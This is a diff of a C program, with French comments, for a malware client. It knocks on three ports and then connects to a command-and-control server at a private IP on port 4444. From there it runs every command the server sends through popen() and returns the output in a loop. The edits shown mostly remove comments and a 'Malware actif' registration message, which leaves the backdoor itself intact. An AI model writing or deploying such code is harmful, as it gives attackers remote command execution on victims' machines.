@@ -5,7 +5,7 @@
 #include <arpa/inet.h>
 
 
-#define SERVER_IP "192.168.111.208"  // Change avec l'IP de ton serveur C2
+#define SERVER_IP "192.168.111.208"
 #define KNOCK_PORTS {4000, 5000, 6000}
 #define PORT 4444
 #define BUFFER_SIZE 1024
@@ -28,7 +28,7 @@ int main() {
     for (int i = 0; i < sizeof(ports) / sizeof(ports[0]); i++)
         knock_port(ports[i]);
 
-    printf("[+] Connexion au C2 sur %d...\n", PORT);
+    printf(">> Connexion au C2 sur %d...\n", PORT);
     
     
     int sock;
@@ -48,9 +48,6 @@ int main() {
     }
     printf("[Client] Connecté au serveur C2.\n");
 
-    // Envoi d'un message d'enregistrement
-    send(sock, "Malware actif", 14, 0);
-
     // Écoute en boucle des commandes du serveur C2
     while (1) {
         memset(buffer, 0, BUFFER_SIZE);
@@ -63,14 +60,13 @@ int main() {
         buffer[bytes_received] = '\0';
         printf("[Client] Commande reçue : %s\n", buffer);
 
-        // Vérifier si la commande est "exit"
         if (strcmp(buffer, "exit") == 0) {
             printf("[Client] Fermeture du client.\n");
             break;
         }
 
         // Exécuter la commande et récupérer la sortie
-        FILE *fp = popen(buffer, "r");  // Ouvre un pipe pour exécuter la commande
+        FILE *fp = popen(buffer, "r");  
         if (fp == NULL) {
             send(sock, "[Client] Erreur lors de l'exécution de la commande\n", 49, 0);
             continue;
